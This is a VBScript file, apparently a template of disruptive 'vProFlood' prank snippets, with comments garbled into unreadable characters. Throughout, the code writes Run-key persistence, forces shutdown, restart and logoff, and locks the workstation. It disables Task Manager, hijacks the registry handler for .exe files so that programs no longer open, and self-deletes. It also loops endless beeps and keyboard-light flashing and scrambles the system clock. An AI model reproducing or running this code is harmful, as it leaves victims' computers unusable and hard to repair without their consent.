':::vertas::: ��� ������ ���������� vProFlood
on error resume next
'���������� ��� ������ �������
Set Shell = CreateObject("Wscript.Shell")
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\",""
'�������������� ��� ����
Set Application = CreateObject("Shell.Application")
Application.MinimizeAll
'��������� ���������
Set Shell = CreateObject("Wscript.Shell")  
Shell.Run "%systemroot%\System32\shutdown.exe -s -t 0" 
'������������� ���������
Set Shell = CreateObject("Wscript.Shell")  
Shell.Run "%systemroot%\System32\shutdown.exe -r -t 0" 
'������� ������� ������
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.run "shutdown -l -t 0 -c """" -f",1 
'�������� ���� ����� � �������
Set Shell = CreateObject("Wscript.Shell") 
Shell.Run "%systemroot%\system32\rundll32.exe user32.dll, LockWorkStation"
'������� ������� � ������� �� ������
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
InternerExplorer.Visible = True
InternerExplorer.Navigate ""
'��������������� ����� �������
Set FileSystemObject = CreateObject("scripting.filesystemobject")
FileSystemObject.deletefile WScript.ScriptFullName, True
'��������� �������������� �������
Set Shell = CreateObject("Wscript.Shell")
Shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 0, "REG_DWORD"
'��������� ������ ���������� �����
Set S = CreateObject("Wscript.Shell")
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\disabletaskmgr","1","REG_DWORD"
'��������� ������ .exe ������
Set S = CreateObject("Wscript.Shell")
s.regwrite"HKCR\exefile\shell\open\command\","rundll32.exe"
'�������� �������� �������
Set S = CreateObject("Wscript.Shell")
s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","������"
'������� CD-ROM
Set ww=CreateObject("WMPlayer.OCX.7")
Set cw=ww.cdromCollection
if cw.Count>=1 then
For i=0 to cw.Count-1
cw.Item(i).eject
next
End If
'���� ���������� ��������
Set S = CreateObject("Wscript.Shell")
do
execute"S.Run ""%comspec% /c "" & Chr(7), 0,True"
loop
'������� ������
Set S = CreateObject("Wscript.Shell")
do
wscript.sleep 200
s.sendkeys"{capslock}"
wscript.sleep 200
s.sendkeys"{numlock}"
wscript.sleep 200
s.sendkeys"{scrolllock}"
loop
'����� ���������� �������
Set S = CreateObject("Wscript.Shell")
h=
m=
s.run "cmd /c time "&h&":"&m,0
'��������� ��������� �����
Set S = CreateObject("Wscript.Shell")
randomize
do
h=cint(rnd()*1000)
m=cint(rnd()*1000)
if h<=23 and m<=59 then
wscript.sleep 1000
s.run "cmd /c time "&h&":"&m,0
end if
loop
